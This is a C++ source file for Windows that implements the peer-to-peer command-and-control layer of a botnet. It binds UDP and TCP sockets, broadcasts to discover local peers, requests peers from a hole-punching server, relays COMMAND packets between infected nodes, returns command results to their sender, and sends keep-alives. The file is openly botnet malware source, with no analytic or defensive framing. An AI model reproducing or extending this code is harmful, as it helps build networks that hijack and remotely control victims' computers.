#include "Communication.h"

#include <vector>
#include <thread>
#include <malloc.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

#include "network.h"
#include "ipc_manage.h"
#include "botnet.h"

#define UDP_PORT 54000
#define TCP_PORT 55000
#define TCP_BACKLOG 10

static SOCKET udp_sock;
static SOCKET tcp_sock;
static BotnetNode botnet_topology;

/* init */
/*
* @purpose: Create basic sockets for communication operations.
* @params: none.
* @return: void.
* 
*/
void create_communication_sockets()
{
	/* locals */
	struct sockaddr_in server_struct;
	
	/* create and check udp socket */
	check((udp_sock = socket(AF_INET, SOCK_DGRAM, 0)), "can't create udp_sock");

	/* compatible with broadcasts */
	int trueflag = 1;
	setsockopt(udp_sock, SOL_SOCKET, SO_BROADCAST, (char*)&trueflag, sizeof(trueflag));

	/* bind the udp socket */
	server_struct.sin_addr.S_un.S_addr = ADDR_ANY;
	server_struct.sin_family = AF_INET;
	server_struct.sin_port = htons(UDP_PORT);
	check(bind(udp_sock, (struct sockaddr*)&server_struct, sizeof(server_struct)), "can't bind udp_sock");
	
	/* create and check tcp socket */
	check((tcp_sock = socket(AF_INET, SOCK_STREAM, 0)), "can't create tcp_sock");

	/* bind the tcp socket */
	server_struct.sin_addr.S_un.S_addr = ADDR_ANY;
	server_struct.sin_family = AF_INET;
	server_struct.sin_port = htons(TCP_PORT);
	check(bind(tcp_sock, (struct sockaddr*)&server_struct, sizeof(server_struct)), "can't bind tcp_sock");

	/* open tcp socket */
	listen(tcp_sock, TCP_BACKLOG);
}

/* syncs */
void sync_request()
{
	/* locals */
	struct botnet_pack p;
	struct sockaddr_in broadcast;
	uint32_t host;
	uint32_t netmask;

	/* request msg */
	ZeroMemory(&p, BOTNET_PACK_SIZE);
	p.type = PACK_TYPE::PEER_REPLY;

	/* send request to all connected networks */
	for (size_t i = 0; i < adapters_count; i++)
	{
		host = DEC_ADAPTER_IPS_ARR[i].hip;
		netmask = DEC_ADAPTER_IPS_ARR[i].netmask;

		/* create broadcast destination */
		broadcast.sin_family = AF_INET;
		broadcast.sin_port = htons(UDP_PORT);
		broadcast.sin_addr.S_un.S_addr = host | (~netmask);

		sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&broadcast, sizeof(broadcast));
	}
}

static void sync_reply(struct sockaddr_in& client)
{
	/* locals */
	struct botnet_pack p;	

	/* reply msg */
	ZeroMemory(&p, BOTNET_PACK_SIZE);
	p.type = PACK_TYPE::PEER_REPLY;
	p.private_peer.ip = 0xff; // avoid reply
	/* send the msg */
	sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
}
/* end syncs */

/* P2P */
/*
* @purpose: ask the hole puncing server for a peer.
* @params: socket used to send the request.
* @return void.
*
*/
void peer_request()
{
	/* locals */
	struct botnet_pack pack;
	static struct sockaddr_in server;

	/* create request */
	ZeroMemory(&pack, BOTNET_PACK_SIZE);
	pack.type = PEER_REQUEST;

	/* destination */
	server.sin_family = AF_INET;
	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
	inet_pton(AF_INET, HOLE_PUNCHING_SERVER_IP, &server.sin_addr);

	/* send request */
	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
}
/* end P2P */

/* handling incomings */
static void handle_command(u_char* const data, const struct sockaddr_in& src_addr)
{
	struct botnet_pack* const command = (struct botnet_pack*)data;
	
	if (command->dst_peer.ip + command->dst_peer.port + command->private_peer.ip + command->private_peer.port == 0)
		send_command(data, BOTNET_PACK_SIZE);
	else
	{
		BOOL path_status;
		command->numerics.id = botnet_topology.fowardCommand(command->numerics.id, src_addr);
		struct sockaddr_in next_peer = botnet_topology.nextPathNode(command->dst_peer, command->private_peer, &path_status);
		
		if (path_status)
		{
			if (next_peer.sin_addr.s_addr == command->dst_peer.ip && next_peer.sin_port == command->dst_peer.port)
				command->dst_peer = { 0, 0 };

			if (next_peer.sin_addr.s_addr == command->private_peer.ip && next_peer.sin_port == command->dst_peer.port)
				command->private_peer = { 0, 0 };

			sendto(udp_sock, (char*)data, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&next_peer, sizeof(next_peer));
		}
	}
}

static void handle_command_result(u_char* const data)
{
	/* locals */
	struct sockaddr_in src_peer;
	adr addr;

	addr = botnet_topology.retrieveCommand((struct botnet_pack*)data);
	if (addr.ip + addr.port == 0)
		return;

	/* rebuild the sockaddr_in structure */
	src_peer.sin_family = AF_INET;
	src_peer.sin_port = addr.port;
	src_peer.sin_addr.s_addr = addr.ip;

	/* send back the result */
	sendto(udp_sock, (char*)data, 1024, 0, (struct sockaddr*)&src_peer, sizeof(src_peer));
}

static void keep_alive_reply(struct sockaddr_in& client)
{
	/* locals */
	struct botnet_pack pack;
	
	/* create keep_alive reply */
	memset(&pack, 0, BOTNET_PACK_SIZE);
	pack.type = KEEP_ALIVE_ACK;

	/* send to client */
	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
}

static void handle_peer_reply(const u_char* data, struct sockaddr_in& client)
{
	/* locals */
	struct sockaddr_in peer;
	BOOL status = 0;

	/* add peer */
	peer = botnet_topology.addPeer((struct botnet_pack*)data, client, &status);

	/* if local peer */
	if (status == 1)
		sync_reply(client);

	// open udp session for direct communication
	if (status)
	{
		/* create request */
		struct botnet_pack pack;
		ZeroMemory(&pack, BOTNET_PACK_SIZE);
		pack.type = PACK_TYPE::NETWORK_SYNC_REQUEST;

		/* send to peer */
		sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&peer, sizeof(peer));
	}
}

static int handle_udp_connections()
{
	/* locals */
	u_char data[1024];
	struct botnet_pack* p = (struct botnet_pack*)data;
	struct sockaddr_in client;
	int client_size = sizeof(client);
	std::vector<adr> hosts;

	/* recv packet */
	recvfrom(udp_sock, (char*)data, 1024, 0, (struct sockaddr*)&client, &client_size);
	
	for (size_t i = 0; i < adapters_count; i++)
		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
			return 0;
	
	switch (p->type)
	{
	case PACK_TYPE::COMMAND:
		handle_command(data, client);
		break;
	case PACK_TYPE::COMMAND_RESULT:
		handle_command_result(data);
		break;
	case PACK_TYPE::PEER_REPLY:
		handle_peer_reply(data, client);
		break;
	case PACK_TYPE::NETWORK_SYNC_REQUEST:
		botnet_topology.sendNetTree(udp_sock, client, hosts ,(char*)data);
		break;
	case PACK_TYPE::NETWORK_SYNC_REPLY:
		botnet_topology.handleSync(data, client);
		break;
	case PACK_TYPE::KEEP_ALIVE:
		keep_alive_reply(client);
	default:
		return 0;
	}
	return 1;
}

static void handle_tcp_connections(SOCKET client)
{

}

/*
* @purpose: Handle inbound packets.
* @params: none.
* @return: void.
* 
*/
void handle_incomings()
{
	fd_set master, copy;
	FD_ZERO(&master);
	FD_SET(udp_sock, &master);
	FD_SET(tcp_sock, &master);

	struct timeval tv = { 30, 0 };   // sleep for 30 seconds.
	int flag;

	while (1)
	{
		flag = 1;
		copy = master;
		size_t socketCount = select(0, &copy, NULL, NULL, &tv);

		for (size_t i = 0; i < socketCount; i++)
		{
			SOCKET s = copy.fd_array[i];
			if (s == udp_sock)
				flag = handle_udp_connections();
			else if (s == tcp_sock)
			{
				SOCKET client = accept(tcp_sock, NULL, NULL);
				FD_SET(client, &master);
			}
			else
			{
				handle_tcp_connections(s);
				FD_CLR(s, &master);
			}
		}
		if (flag)
			botnet_topology.keepAlive(udp_sock);
	}
}
/* end handling incomings */